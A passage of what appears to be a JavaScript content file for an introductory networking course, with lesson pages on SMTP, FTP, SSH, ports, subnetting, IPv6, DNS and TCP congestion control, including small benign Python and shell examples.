        titleEn: "Demo — Sending Email with Python",
        contentEn: `
          <p>Python can send email using the built-in <code>smtplib</code> module:</p>
<pre><code>import smtplib
from email.mime.text import MIMEText

# Create the message
msg = MIMEText("Hello! This is a test email.")
msg["Subject"] = "Test Email"
msg["From"] = "sender@example.com"
msg["To"] = "recipient@example.com"

# Connect to SMTP server and send
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()  # Upgrade to encrypted connection
    server.login("sender@example.com", "app_password")
    server.send_message(msg)
    print("Email sent!")
</code></pre>
          <p><strong>Important notes:</strong></p>
          <ul>
            <li><code>starttls()</code> — upgrades the connection to TLS encryption</li>
            <li>Gmail requires an <strong>App Password</strong> (not your regular password)</li>
            <li><code>MIMEText</code> creates a properly formatted email message</li>
          </ul>
        `
      },
      {
        // Page 2: FTP
        titleEn: "FTP — File Transfer Protocol",
        contentEn: `
          <p><strong>FTP</strong> transfers files between computers. It uses <strong>two connections</strong>:</p>
          <ul>
            <li><strong>Control connection</strong> (port 21) — sends commands (LIST, GET, PUT)</li>
            <li><strong>Data connection</strong> (port 20 or random) — transfers the actual file data</li>
          </ul>
          <p><strong>Active mode:</strong></p>
          <ul>
            <li>The client tells the server "connect to me on port X"</li>
            <li>The server opens a connection back to the client</li>
            <li>Problem: firewalls often block incoming connections</li>
          </ul>
          <p><strong>Passive mode:</strong></p>
          <ul>
            <li>The client asks the server "give me a port to connect to"</li>
            <li>The client opens the data connection to the server</li>
            <li>Works better with firewalls — most FTP clients use this</li>
          </ul>
          <p><strong>SFTP</strong> (SSH File Transfer Protocol) is the secure alternative — runs over SSH, encrypted.</p>
        `
      },
      {
        // Page 3: SSH
        titleEn: "SSH — Secure Shell (Port 22)",
        contentEn: `
          <p><strong>SSH</strong> gives you a secure, encrypted connection to a remote computer.</p>
          <ul>
            <li>Default port: <strong>22</strong></li>
            <li>Replaces Telnet (which was not encrypted)</li>
            <li>Used to manage servers, run commands remotely</li>
          </ul>
          <p><strong>Authentication methods:</strong></p>
          <ul>
            <li><strong>Password</strong> — simple but less secure</li>
            <li><strong>SSH keys</strong> — public/private key pair, much more secure</li>
          </ul>
          <p><strong>Common uses:</strong></p>
          <ul>
            <li><code>ssh user@server.com</code> — connect to a remote server</li>
            <li><code>scp file.txt user@server:/path/</code> — copy a file securely</li>
            <li><strong>SSH tunnel</strong> — forward a local port through an encrypted connection</li>
          </ul>
          <p><strong>SSH key setup:</strong></p>
<pre><code>ssh-keygen -t ed25519         # Generate a key pair
ssh-copy-id user@server.com   # Copy public key to server
ssh user@server.com           # Login without password
</code></pre>
        `
      },
      {
        // Page 4: Well-known ports
        titleEn: "Well-Known Ports",
        contentEn: `
          <p>Each service has a default port number. Here are the most important ones:</p>
          <table>
            <thead><tr><th>Port</th><th>Protocol</th><th>Description</th></tr></thead>
            <tbody>
              <tr><td>20-21</td><td>FTP</td><td>File Transfer (data + control)</td></tr>
              <tr><td>22</td><td>SSH</td><td>Secure Shell — encrypted remote access</td></tr>
              <tr><td>23</td><td>Telnet</td><td>Remote access — NOT encrypted (avoid!)</td></tr>
              <tr><td>25</td><td>SMTP</td><td>Sending email (server-to-server)</td></tr>
              <tr><td>53</td><td>DNS</td><td>Domain name resolution</td></tr>
              <tr><td>67-68</td><td>DHCP</td><td>Automatic IP address assignment</td></tr>
              <tr><td>80</td><td>HTTP</td><td>Web — not encrypted</td></tr>
              <tr><td>443</td><td>HTTPS</td><td>Web — encrypted with TLS</td></tr>
              <tr><td>587</td><td>SMTP</td><td>Sending email (client, with TLS)</td></tr>
              <tr><td>993</td><td>IMAP</td><td>Reading email (with TLS)</td></tr>
              <tr><td>995</td><td>POP3</td><td>Downloading email (with TLS)</td></tr>
              <tr><td>3306</td><td>MySQL</td><td>MySQL database</td></tr>
              <tr><td>3389</td><td>RDP</td><td>Remote Desktop (Windows)</td></tr>
            </tbody>
          </table>
          <p>Ports 0–1023 are <strong>well-known ports</strong> (reserved for standard services).</p>
        `
      },
      {
        // Page 5: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>SMTP</strong> sends email (port 587), <strong>IMAP</strong> reads email (port 993), <strong>POP3</strong> downloads email (port 995)</li>
            <li>Python's <code>smtplib</code> can send email programmatically</li>
            <li><strong>FTP</strong> uses two connections — control (port 21) and data (port 20)</li>
            <li>FTP has <strong>active</strong> and <strong>passive</strong> modes — passive works better with firewalls</li>
            <li><strong>SSH</strong> (port 22) provides encrypted remote access — replaced Telnet</li>
            <li>SSH keys are more secure than passwords</li>
            <li>Ports 0–1023 are <strong>well-known ports</strong> for standard services</li>
          </ul>
        `
      },
      {
        // Page 6: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 17 ==========
  17: {
    titleEn: "Subnetting and CIDR — Network Division",
    pages: [
      {
        // Page 0: What is subnetting
        titleEn: "What Is Subnetting?",
        contentEn: `
          <p><strong>Subnetting</strong> means dividing a large network into smaller networks.</p>
          <p><strong>Why do we need it?</strong></p>
          <ul>
            <li><strong>Organization</strong> — separate departments, floors, or buildings</li>
            <li><strong>Security</strong> — isolate sensitive networks</li>
            <li><strong>Performance</strong> — reduce broadcast traffic</li>
          </ul>
          <p>An IP address has two parts:</p>
          <ul>
            <li><strong>Network part</strong> — identifies which network</li>
            <li><strong>Host part</strong> — identifies which device on that network</li>
          </ul>
          <p>The <strong>subnet mask</strong> tells us where to split:</p>
          <ul>
            <li><code>255.255.255.0</code> — first 24 bits = network, last 8 bits = host</li>
            <li>This gives us 254 usable host addresses (256 − 2)</li>
          </ul>
        `
      },
      {
        // Page 1: CIDR notation
        titleEn: "CIDR Notation",
        contentEn: `
          <p><strong>CIDR</strong> (Classless Inter-Domain Routing) is a short way to write the subnet mask.</p>
          <p>Instead of <code>255.255.255.0</code>, we write <code>/24</code>.</p>
          <p>The number after the slash = how many bits are the <strong>network part</strong>.</p>
          <table>
            <thead><tr><th>CIDR</th><th>Subnet Mask</th><th>Hosts</th><th>Use Case</th></tr></thead>
            <tbody>
              <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>Very large network</td></tr>
              <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Large organization</td></tr>
              <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Typical LAN</td></tr>
              <tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Small subnet</td></tr>
              <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Point-to-point link</td></tr>
              <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>Single host</td></tr>
            </tbody>
          </table>
          <p><strong>Example:</strong> <code>192.168.1.0/24</code> means network 192.168.1.x with 254 usable hosts.</p>
        `
      },
      {
        // Page 2: Private vs Public IPs
        titleEn: "Private vs Public IP Addresses",
        contentEn: `
          <p>Not all IP addresses are visible on the Internet.</p>
          <p><strong>Private IPs</strong> — used inside local networks (not routed on the Internet):</p>
          <table>
            <thead><tr><th>Range</th><th>CIDR</th><th>Common Use</th></tr></thead>
            <tbody>
              <tr><td>10.0.0.0 – 10.255.255.255</td><td>10.0.0.0/8</td><td>Large companies</td></tr>
              <tr><td>172.16.0.0 – 172.31.255.255</td><td>172.16.0.0/12</td><td>Medium networks</td></tr>
              <tr><td>192.168.0.0 – 192.168.255.255</td><td>192.168.0.0/16</td><td>Home networks</td></tr>
            </tbody>
          </table>
          <p><strong>Public IPs</strong> — unique addresses on the Internet.</p>
          <ul>
            <li>Assigned by your ISP</li>
            <li>Every website has a public IP</li>
          </ul>
          <p><strong>NAT</strong> (Network Address Translation) lets many private IPs share one public IP. Your home router does this — all your devices use private IPs, but the router translates them to one public IP.</p>
        `
      },
      {
        // Page 3: Subnetting calculation
        titleEn: "Subnetting Calculation Example",
        contentEn: `
          <p><strong>Problem:</strong> You have the network <code>192.168.10.0/24</code>. Divide it into 4 subnets.</p>
          <p><strong>Step 1:</strong> How many bits do we need to borrow?</p>
          <ul>
            <li>4 subnets → 2 bits (2² = 4)</li>
            <li>New mask: /24 + 2 = <strong>/26</strong></li>
            <li>Subnet mask: 255.255.255.192</li>
          </ul>
          <p><strong>Step 2:</strong> Calculate the subnets.</p>
          <ul>
            <li>Each subnet has 2⁶ = 64 addresses (62 usable)</li>
          </ul>
          <table>
            <thead><tr><th>Subnet</th><th>Range</th><th>Broadcast</th><th>Usable Hosts</th></tr></thead>
            <tbody>
              <tr><td>192.168.10.0/26</td><td>.1 – .62</td><td>.63</td><td>62</td></tr>
              <tr><td>192.168.10.64/26</td><td>.65 – .126</td><td>.127</td><td>62</td></tr>
              <tr><td>192.168.10.128/26</td><td>.129 – .190</td><td>.191</td><td>62</td></tr>
              <tr><td>192.168.10.192/26</td><td>.193 – .254</td><td>.255</td><td>62</td></tr>
            </tbody>
          </table>
          <p><strong>Remember:</strong> First address = network address, last address = broadcast. Both are not usable.</p>
        `
      },
      {
        // Page 4: Demo Python ipaddress
        titleEn: "Demo — Python ipaddress Module",
        contentEn: `
          <p>Python has a built-in module for working with IP addresses and subnets:</p>
<pre><code>import ipaddress

# Create a network
net = ipaddress.ip_network("192.168.10.0/24")
print(net.network_address)   # 192.168.10.0
print(net.broadcast_address) # 192.168.10.255
print(net.num_addresses)     # 256
print(net.netmask)           # 255.255.255.0

# List all usable hosts
for host in net.hosts():
    print(host)  # 192.168.10.1 ... 192.168.10.254

# Divide into 4 subnets
subnets = list(net.subnets(prefixlen_diff=2))
for s in subnets:
    print(f"{s} → {s.num_addresses} addresses")
# 192.168.10.0/26   → 64 addresses
# 192.168.10.64/26  → 64 addresses
# 192.168.10.128/26 → 64 addresses
# 192.168.10.192/26 → 64 addresses

# Check if an IP is in a network
ip = ipaddress.ip_address("192.168.10.50")
print(ip in net)  # True
</code></pre>
        `
      },
      {
        // Page 5: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 6: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>Subnetting</strong> divides a large network into smaller, isolated networks</li>
            <li><strong>CIDR notation</strong> (/24, /26, etc.) shows how many bits are the network part</li>
            <li><strong>Private IPs</strong> (10.x, 172.16-31.x, 192.168.x) are used inside local networks</li>
            <li><strong>NAT</strong> lets many private IPs share one public IP</li>
            <li>To subnet: borrow bits from the host part → more subnets, fewer hosts each</li>
            <li>First address = network, last address = broadcast (both not usable)</li>
            <li>Python's <code>ipaddress</code> module makes subnet calculations easy</li>
          </ul>
        `
      },
      {
        // Page 7: simulation — SKIP
        titleEn: "Simulation",
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },
  18: {
    titleEn: "IPv6 — The New Internet Address",
    pages: [
      {
        titleEn: "Why Do We Need IPv6?",
        contentEn: `<p>IPv4 gives us about 4.3 billion addresses. That sounds like a lot, but:</p>
<ul>
<li>The world has 8 billion people</li>
<li>Each person may have a phone, laptop, tablet, smart watch</li>
<li>IoT devices (cameras, sensors, fridges) need addresses too</li>
</ul>
<p>We ran out of IPv4 addresses in 2011. Since then, we use workarounds like NAT. But NAT has problems:</p>
<ul>
<li>Breaks direct device-to-device connections</li>
<li>Makes peer-to-peer apps harder</li>
<li>Adds complexity to every network</li>
</ul>
<p><strong>IPv6 solves this.</strong> It provides 340 undecillion addresses (3.4 x 10^38). That is enough to give every grain of sand on Earth its own address — billions of times over.</p>`
      },
      {
        titleEn: "IPv6 Address Format",
        contentEn: `<p>An IPv6 address is <strong>128 bits</strong> long (IPv4 is only 32 bits).</p>
<p>It is written as <strong>8 groups of 4 hex digits</strong>, separated by colons:</p>
<pre>2001:0db8:85a3:0000:0000:8a2e:0370:7334</pre>
<p><strong>Shortening rules:</strong></p>
<ul>
<li>Drop leading zeros in each group: <code>0db8</code> becomes <code>db8</code></li>
<li>Replace one sequence of all-zero groups with <code>::</code> (only once)</li>
</ul>
<p>Example:</p>
<pre>2001:0db8:0000:0000:0000:0000:0000:0001
2001:db8::1</pre>
<p>Both are the same address. The <code>::</code> replaces six groups of zeros.</p>
<p><strong>Key difference from IPv4:</strong></p>
<ul>
<li>IPv4: <code>192.168.1.1</code> (decimal, dots)</li>
<li>IPv6: <code>2001:db8::1</code> (hex, colons)</li>
</ul>`
      },
      {
        titleEn: "IPv6 Address Types",
        contentEn: `<p>IPv6 has several address types:</p>
<h3>Global Unicast</h3>
<ul>
<li>Start with <code>2000::/3</code> (addresses beginning with 2 or 3)</li>
<li>Like a public IPv4 address — routable on the internet</li>
<li>Every device can have its own global address. No NAT needed!</li>
</ul>
<h3>Link-Local</h3>
<ul>
<li>Start with <code>fe80::/10</code></li>
<li>Work only on the local network segment</li>
<li>Every IPv6 device creates one automatically</li>
<li>Used for neighbor discovery and local communication</li>
</ul>
<h3>Loopback</h3>
<ul>
<li><code>::1</code> — the device talks to itself</li>
<li>Same idea as <code>127.0.0.1</code> in IPv4</li>
</ul>
<h3>Multicast</h3>
<ul>
<li>Start with <code>ff00::/8</code></li>
<li>Send one packet to a group of devices</li>
<li>IPv6 has no broadcast. Multicast replaces it</li>
<li>Example: <code>ff02::1</code> = all nodes on the link</li>
</ul>`
      },
      {
        titleEn: "IPv6 Header — Simple and Fixed",
        contentEn: `<p>The IPv6 header is <strong>40 bytes</strong>, always fixed size. The IPv4 header is 20-60 bytes (variable).</p>
<p><strong>IPv6 header fields:</strong></p>
<ul>
<li><strong>Version</strong> (4 bits): always 6</li>
<li><strong>Traffic Class</strong> (8 bits): priority of the packet (like QoS)</li>
<li><strong>Flow Label</strong> (20 bits): identifies a flow of packets (new in IPv6)</li>
<li><strong>Payload Length</strong> (16 bits): size of the data after the header</li>
<li><strong>Next Header</strong> (8 bits): what comes after this header (TCP, UDP, or extension header)</li>
<li><strong>Hop Limit</strong> (8 bits): same as TTL in IPv4 — decreases by 1 at each router</li>
<li><strong>Source Address</strong> (128 bits): sender</li>
<li><strong>Destination Address</strong> (128 bits): receiver</li>
</ul>
<p><strong>What IPv6 removed:</strong></p>
<ul>
<li>No header checksum — layers above (TCP/UDP) handle error checking</li>
<li>No fragmentation fields — only the sender can fragment in IPv6</li>
</ul>
<p>Fixed size = routers process packets faster.</p>`
      },
      {
        titleEn: "NDP — Neighbor Discovery Protocol",
        contentEn: `<p>IPv4 uses ARP to find MAC addresses. IPv6 replaces ARP with <strong>NDP</strong> (Neighbor Discovery Protocol).</p>
<p><strong>NDP does several things:</strong></p>
<ul>
<li><strong>Address resolution:</strong> "Who has this IPv6 address? Tell me your MAC." (Like ARP)</li>
<li><strong>Router discovery:</strong> devices find routers on the network automatically</li>
<li><strong>Auto-configuration (SLAAC):</strong> devices create their own IPv6 address without DHCP</li>
<li><strong>Duplicate address detection:</strong> checks if an address is already in use</li>
</ul>
<p><strong>How address resolution works:</strong></p>
<ol>
<li>Device A sends a <strong>Neighbor Solicitation</strong> (NS) to a multicast address</li>
<li>Device B replies with a <strong>Neighbor Advertisement</strong> (NA) containing its MAC</li>
</ol>
<p><strong>SLAAC (Stateless Auto-Configuration):</strong></p>
<ol>
<li>Router sends a Router Advertisement (RA) with the network prefix</li>
<li>Device takes the prefix + generates a host part from its MAC address</li>
<li>Device now has a full IPv6 address — no DHCP server needed</li>
</ol>`
      },
      {
        titleEn: "Transition: IPv4 to IPv6",
        contentEn: `<p>We cannot switch the whole internet to IPv6 overnight. Both protocols must work together during the transition.</p>
<h3>Dual Stack</h3>
<ul>
<li>Devices run both IPv4 and IPv6 at the same time</li>
<li>If the destination supports IPv6, use IPv6. Otherwise, use IPv4</li>
<li>Most modern operating systems support dual stack</li>
<li>This is the most common approach today</li>
</ul>
<h3>Tunneling (6in4, 6to4)</h3>
<ul>
<li>Wrap IPv6 packets inside IPv4 packets</li>
<li>IPv6 traffic travels through IPv4 networks</li>
<li>Like putting a letter inside another envelope</li>
<li>Used when the path between two IPv6 networks is IPv4-only</li>
</ul>
<h3>NAT64 / DNS64</h3>
<ul>
<li>Translates between IPv6 and IPv4</li>
<li>IPv6-only devices can reach IPv4-only servers</li>
<li>Used by mobile carriers (T-Mobile, for example)</li>
</ul>
<p><strong>Current status:</strong> About 40% of Google traffic is IPv6 (2024). Full transition will take many more years.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>IPv4 has only 4.3 billion addresses — not enough for today's world</li>
<li>IPv6 uses 128-bit addresses (8 groups of hex), providing practically unlimited addresses</li>
<li>Address types: global unicast (public), link-local (local only), loopback (::1), multicast</li>
<li>IPv6 header is fixed 40 bytes — simpler and faster than IPv4</li>
<li>NDP replaces ARP, and adds auto-configuration (SLAAC) — no DHCP needed</li>
<li>Transition uses dual stack (both protocols), tunneling, or NAT64 translation</li>
<li>About 40% of internet traffic is already IPv6</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  19: {
    titleEn: "DNS in Depth",
    pages: [
      {
        titleEn: "The DNS Hierarchy",
        contentEn: `<p>DNS is like a phone book for the internet. It turns names (google.com) into IP addresses (142.250.80.46).</p>
<p>DNS is organized as a <strong>tree</strong> with three levels:</p>
<h3>Root Servers</h3>
<ul>
<li>13 root server groups (A through M), run by different organizations</li>
<li>They do not know every domain. They know where to find TLD servers</li>
<li>There are actually hundreds of copies worldwide (anycast)</li>
</ul>
<h3>TLD Servers (Top-Level Domain)</h3>
<ul>
<li>Handle <code>.com</code>, <code>.org</code>, <code>.net</code>, <code>.il</code>, etc.</li>
<li>Verisign runs <code>.com</code> — the biggest TLD</li>
<li>They know which authoritative server handles each domain</li>
</ul>
<h3>Authoritative Servers</h3>
<ul>
<li>The final answer. They hold the actual DNS records for a domain</li>
<li>Example: Cloudflare's servers are authoritative for millions of domains</li>
<li>The domain owner controls what records are stored here</li>
</ul>`
      },
      {
        titleEn: "Recursive Resolution — Step by Step",
        contentEn: `<p>When you type <code>www.example.com</code> in your browser, here is what happens:</p>
<ol>
<li><strong>Browser cache:</strong> Did I look this up recently? If yes, use the cached answer</li>
<li><strong>OS cache:</strong> The operating system checks its own DNS cache</li>
<li><strong>Recursive resolver:</strong> Your ISP's DNS server (or 8.8.8.8, 1.1.1.1) takes over</li>
<li><strong>Root server:</strong> Resolver asks a root server: "Where is .com?" Root answers with TLD server address</li>
<li><strong>TLD server:</strong> Resolver asks the .com TLD: "Where is example.com?" TLD answers with the authoritative server</li>
<li><strong>Authoritative server:</strong> Resolver asks: "What is the IP of www.example.com?" Gets the final answer</li>
<li><strong>Response:</strong> Resolver sends the IP back to your computer. Browser connects</li>
</ol>
<p>This full process takes about <strong>50-200 ms</strong> the first time. After that, the answer is cached and takes less than 1 ms.</p>
<p>The recursive resolver does all the hard work. Your device only sends one query and gets one answer.</p>`
      },
      {
        titleEn: "DNS Record Types",
        contentEn: `<p>A domain can have many types of records:</p>
<ul>
<li><strong>A</strong> — Maps a name to an IPv4 address. <code>example.com → 93.184.216.34</code></li>
<li><strong>AAAA</strong> — Maps a name to an IPv6 address. <code>example.com → 2606:2800:220:1:...</code></li>
<li><strong>CNAME</strong> — Alias. Points one name to another. <code>www.example.com → example.com</code></li>
<li><strong>MX</strong> — Mail server. Tells email where to go. <code>example.com → mail.example.com (priority 10)</code></li>
<li><strong>NS</strong> — Name server. Which DNS server is authoritative for this domain</li>
<li><strong>TXT</strong> — Text data. Used for email security (SPF, DKIM, DMARC) and domain verification</li>
<li><strong>SOA</strong> — Start of Authority. Contains the primary name server, admin email, serial number, and timing values</li>
<li><strong>PTR</strong> — Reverse lookup. Maps an IP address back to a name. Used for email verification</li>
</ul>
<p><strong>A single domain often has many records.</strong> For example, google.com has A, AAAA, MX, NS, TXT, and SOA records.</p>`
      },
      {
        titleEn: "Demo: The dig Command",
        type: "simulation",
        contentEn: `<p>The <code>dig</code> command lets you query DNS servers directly from the terminal.</p>
<h3>Basic query:</h3>
<pre>$ dig example.com

;; ANSWER SECTION:
example.com.    3600    IN    A    93.184.216.34</pre>
<p>This shows: the name, TTL (3600 seconds = 1 hour), record class (IN = Internet), type (A), and the IP address.</p>
<h3>Query a specific record type:</h3>
<pre>$ dig example.com MX

;; ANSWER SECTION:
example.com.    3600    IN    MX    10 mail.example.com.</pre>
<h3>Trace the full resolution path:</h3>
<pre>$ dig +trace example.com</pre>
<p>This shows every step: root → TLD → authoritative. Very useful for debugging DNS problems.</p>
<h3>Query a specific DNS server:</h3>
<pre>$ dig @8.8.8.8 example.com</pre>
<p>This asks Google's DNS server directly instead of your default resolver.</p>`
      },
      {
        titleEn: "DNS Caching and TTL",
        contentEn: `<p>Without caching, every website visit would need 4+ DNS queries. That would be slow and overload DNS servers.</p>
<h3>TTL (Time to Live)</h3>
<ul>
<li>Every DNS record has a TTL value in seconds</li>
<li>TTL = how long the answer can be cached</li>
<li>After TTL expires, the resolver must ask again</li>
</ul>
<p><strong>Common TTL values:</strong></p>
<ul>
<li><strong>300 (5 minutes):</strong> Common for websites that change servers often (CDN, failover)</li>
<li><strong>3600 (1 hour):</strong> Standard for most websites</li>
<li><strong>86400 (24 hours):</strong> Stable records that rarely change</li>
</ul>
<h3>Where caching happens:</h3>
<ul>
<li><strong>Browser:</strong> Keeps its own DNS cache (Chrome: <code>chrome://net-internals/#dns</code>)</li>
<li><strong>Operating system:</strong> System-level DNS cache</li>
<li><strong>Recursive resolver:</strong> ISP or public resolver caches for all users</li>
</ul>
<p><strong>Tradeoff:</strong> Long TTL = faster but slow to update. Short TTL = always fresh but more DNS traffic.</p>`
      },
      {
        titleEn: "Encrypted DNS: DoH and DoT",
        contentEn: `<p>Traditional DNS sends queries in <strong>plain text</strong>. Anyone on the network can see which websites you visit.</p>
<h3>DNS over HTTPS (DoH)</h3>
<ul>
<li>DNS queries travel inside HTTPS (port 443)</li>
<li>Looks like normal web traffic — hard to block</li>
<li>Used by Firefox, Chrome, Edge by default</li>
<li>Providers: Cloudflare (1.1.1.1), Google (8.8.8.8)</li>
</ul>
<h3>DNS over TLS (DoT)</h3>
<ul>
<li>DNS queries are encrypted with TLS (port 853)</li>
<li>Dedicated port makes it easy to identify (and block)</li>
<li>Used more by Android and network-level setups</li>
</ul>
<h3>Why does this matter?</h3>
<ul>
<li>Your ISP cannot see which sites you look up (with DoH/DoT)</li>
<li>Public Wi-Fi attackers cannot spy on your DNS</li>
<li>Prevents DNS hijacking by middlemen</li>
</ul>
<p><strong>Note:</strong> Encrypted DNS hides your queries from the network, but the DNS provider (Cloudflare, Google) still sees them.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>DNS is a hierarchy: root servers → TLD servers → authoritative servers</li>
<li>Recursive resolvers do the work: they walk the tree and cache the answers</li>
<li>Key record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), NS (name server), TXT, SOA, PTR</li>
<li>The <code>dig</code> command lets you query DNS and trace resolution paths</li>
<li>TTL controls how long answers are cached — balances speed vs freshness</li>
<li>DoH (HTTPS, port 443) and DoT (TLS, port 853) encrypt DNS to protect privacy</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  20: {
    titleEn: "TCP in Depth",
    pages: [
      {
        titleEn: "What Problems Does TCP Solve?",
        contentEn: `<p>The internet is unreliable. Packets can be lost, arrive out of order, or flood a slow receiver. TCP solves three main problems:</p>
<h3>1. Packet Loss</h3>
<ul>
<li>Routers drop packets when they are overloaded</li>
<li>Wireless links lose packets to interference</li>
<li>TCP detects lost packets and retransmits them</li>
</ul>
<h3>2. Flow Control</h3>
<ul>
<li>A fast sender can overwhelm a slow receiver</li>
<li>The receiver tells the sender: "I have room for X bytes"</li>
<li>The sender never sends more than the receiver can handle</li>
</ul>
<h3>3. Congestion Control</h3>
<ul>
<li>Too many senders can flood the network</li>
<li>TCP detects congestion (packet loss, delay) and slows down</li>
<li>All TCP connections share the network fairly</li>
</ul>
<p>TCP uses <strong>sequence numbers</strong> and <strong>acknowledgments</strong> (ACKs) to track every byte. If an ACK does not arrive in time, TCP assumes the packet was lost and sends it again.</p>`
      },
      {
        titleEn: "Sliding Window and Flow Control",
        contentEn: `<p>TCP uses a <strong>sliding window</strong> to control how much data is sent before waiting for an ACK.</p>
<h3>Receive Window (rwnd)</h3>
<ul>
<li>The receiver advertises how much buffer space it has</li>
<li>This value is sent in every ACK packet</li>
<li>The sender will not send more than <code>rwnd</code> bytes without an ACK</li>
</ul>
<h3>How it works:</h3>
<ol>
<li>Receiver says: "My window is 16 KB" (I can accept 16 KB of data)</li>
<li>Sender sends 16 KB of data in multiple packets</li>
<li>Receiver processes some data, frees buffer space</li>
<li>Receiver ACKs: "Got everything up to byte 16000, window is now 8 KB"</li>
<li>Sender can send 8 KB more</li>
</ol>
<p><strong>Window = 0:</strong> The receiver is full. The sender must stop and wait. It sends small "probe" packets to check when space opens up.</p>
<p>The window slides forward as data is acknowledged. That is why it is called a "sliding window."</p>`
      },
      {
        titleEn: "Congestion Control — Slow Start",
        contentEn: `<p>Flow control protects the receiver. <strong>Congestion control</strong> protects the network.</p>
<h3>Congestion Window (cwnd)</h3>
<ul>
<li>The sender keeps its own limit: the congestion window</li>
<li>The actual sending rate = minimum of rwnd and cwnd</li>
<li>cwnd starts small and grows as the connection succeeds</li>
</ul>
<h3>Slow Start</h3>
<ol>
<li>Connection begins with <code>cwnd = 1 MSS</code> (one packet, about 1460 bytes)</li>
<li>For every ACK received, cwnd increases by 1 MSS</li>
<li>This means cwnd <strong>doubles</strong> every round-trip time (RTT)</li>
<li>1 → 2 → 4 → 8 → 16 → 32 packets... exponential growth</li>
</ol>
<p><strong>When does slow start stop?</strong></p>
<ul>
<li>When cwnd reaches <code>ssthresh</code> (slow start threshold) → switch to congestion avoidance</li>
<li>When a packet is lost → congestion detected, cut cwnd</li>
</ul>
<p>The name "slow start" is misleading. It grows exponentially — it is actually quite fast. But it starts from 1, not from the maximum.</p>`
      },
      {
        titleEn: "Congestion Avoidance — AIMD",
        contentEn: `<p>After slow start reaches <code>ssthresh</code>, TCP switches to <strong>congestion avoidance</strong>.</p>
<h3>AIMD: Additive Increase, Multiplicative Decrease</h3>
<ul>
<li><strong>Additive Increase:</strong> cwnd grows by 1 MSS per RTT (linear, not exponential)</li>
<li><strong>Multiplicative Decrease:</strong> On packet loss, cwnd is cut in half</li>
</ul>
<h3>Why AIMD works:</h3>
<ul>
<li>Slow increase probes for available bandwidth carefully</li>
<li>Fast decrease reacts quickly to congestion</li>
<li>The "sawtooth" pattern: cwnd grows slowly, drops fast, grows again</li>
<li>Over time, all connections converge to a fair share of bandwidth</li>
</ul>
<h3>Two types of loss detection:</h3>
<ul>
<li><strong>Triple duplicate ACK:</strong> Mild congestion. cwnd = cwnd / 2 (fast recovery)</li>
<li><strong>Timeout:</strong> Severe congestion. cwnd = 1 MSS, start over from slow start</li>
</ul>
<p>Triple duplicate ACK means some packets still get through. Timeout means nothing is getting through — the situation is worse.</p>`
      },
      {
        titleEn: "RTT and Timeout Calculation",
        contentEn: `<p>TCP needs to know when a packet is "lost." It uses a <strong>timeout</strong> (RTO). If no ACK arrives within RTO, retransmit.</p>
<h3>RTT (Round Trip Time)</h3>
<ul>
<li>Time from sending a packet to receiving its ACK</li>
<li>RTT changes constantly — network conditions vary</li>
<li>TCP measures RTT for each acknowledged packet</li>
</ul>
<h3>Calculating RTO:</h3>
<ul>
<li><strong>SRTT</strong> (Smoothed RTT): weighted average of recent RTT measurements</li>
<li><strong>RTTVAR</strong>: how much RTT varies (the jitter)</li>
<li><strong>RTO = SRTT + 4 x RTTVAR</strong></li>
</ul>
<p>Example:</p>
<ul>
<li>SRTT = 100 ms, RTTVAR = 20 ms</li>
<li>RTO = 100 + 4 x 20 = <strong>180 ms</strong></li>
</ul>
<h3>Important rules:</h3>
<ul>
<li>Minimum RTO is usually 200 ms (even if RTT is 1 ms)</li>
<li>If a timeout happens, RTO doubles (exponential backoff): 200 → 400 → 800 ms</li>
<li>This prevents a flood of retransmissions during congestion</li>
</ul>`
      },
      {
        titleEn: "Modern Congestion Algorithms",
        contentEn: `<p>The original TCP algorithm (Tahoe/Reno) was designed in 1988. Modern networks need better algorithms.</p>
<h3>TCP Reno (1990)</h3>
<ul>
<li>Added "fast recovery" — do not go back to slow start on triple duplicate ACK</li>
<li>Cut cwnd in half and continue from there</li>
<li>Still the baseline that others are compared to</li>
</ul>
<h3>TCP CUBIC (2006)</h3>
<ul>
<li>Default in Linux since 2006</li>
<li>Uses a cubic function to grow cwnd, not linear</li>
<li>Grows fast when far from the last loss point, slows down near it</li>
<li>Better for high-bandwidth, high-latency links (long fat pipes)</li>
</ul>
<h3>BBR — Bottleneck Bandwidth and RTT (Google, 2016)</h3>
<ul>
<li>Does not use packet loss as a congestion signal</li>
<li>Instead, it measures the actual bottleneck bandwidth and minimum RTT</li>
<li>Tries to send at exactly the right rate — not too fast, not too slow</li>
<li>Used by Google, YouTube, and many CDNs</li>
<li>Works much better on lossy networks (wireless, long distance)</li>
</ul>
<p>BBR is a big shift in thinking. Traditional TCP: "loss = congestion." BBR: "let me measure the real capacity."</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>TCP solves three problems: packet loss (retransmission), flow control (receiver protection), congestion control (network protection)</li>
<li>The receive window (rwnd) is a sliding window — the receiver advertises how much data it can accept</li>
